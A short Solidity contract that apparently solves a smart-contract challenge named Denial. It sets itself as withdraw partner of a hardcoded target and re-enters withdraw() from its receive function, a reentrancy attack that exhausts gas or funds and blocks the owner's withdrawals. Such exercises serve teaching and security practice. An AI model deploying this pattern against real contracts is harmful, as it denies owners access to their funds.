
interface Denial {
    function withdraw() external;
    function setWithdrawPartner(address _partner) external;
}

contract Den {

    Denial d = Denial(0x40A4ed1c111FEAE70978Da897b202cBA041f7b04);

    constructor() {
        d.setWithdrawPartner(address(this));
    }


    receive() external payable {
        d.withdraw();
    }
}